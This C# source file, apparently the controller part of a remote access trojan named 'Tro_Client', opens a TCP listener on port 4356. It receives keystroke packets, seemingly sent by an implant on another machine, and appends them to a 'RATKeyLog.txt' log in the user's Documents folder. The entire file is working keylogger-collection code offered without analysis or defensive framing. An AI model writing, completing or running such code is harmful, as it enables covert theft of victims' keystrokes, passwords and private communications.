using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace Tro_Client
{
    public partial class Form2 : Form
    {
        public static NetworkStream Reciver;
        public string GKeys;
        public Form2()
        {
            InitializeComponent();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
                TcpListener l = new TcpListener(4356);
                l.Start();
                Log("Started TcpListener...", "ALWAYS");
                TcpClient Connection = l.AcceptTcpClient();
                Reciver = Connection.GetStream();
                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
                Log("Started Reciver!", "ALWAYS");
                Rec.Start();
            }
        public void Recive()
        {
            while (true)
            {
                try
                {
                    byte[] RecPacket = new byte[1000];
                    Reciver.Read(RecPacket, 0, RecPacket.Length);
                    Reciver.Flush();
                    string Keys = Encoding.ASCII.GetString(RecPacket);
                    string[] KeysArray = System.Text.RegularExpressions.Regex.Split(Keys, "!!!!---");
                    Keys = KeysArray[0];
                    switch (Keys)
                    {
                        case "Key":
                            string Key = KeysArray[1];
                            GKeys = Key;
                            Log(GKeys.Trim(' '), "KEY");
                            break;
                    }
                }
                catch(Exception e)
                {
                    Log(Convert.ToString(e), "Exception");
                    break;

                }
            }
        }

        public static string GetTempPath()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!path.EndsWith("\\")) path += "\\";
            return path;
        }

        public static void Log(string msg, string art)
        {
            System.IO.StreamWriter sw = System.IO.File.AppendText(
                GetTempPath() + "RATKeyLog.txt");
            try
            {
                string logLine = System.String.Format(
                    "{0:G}: {1}: {2} ", System.DateTime.Now, art, msg);
                sw.WriteLine(logLine);
            }
            finally
            {
                sw.Close();
            }
        }
    }
    }

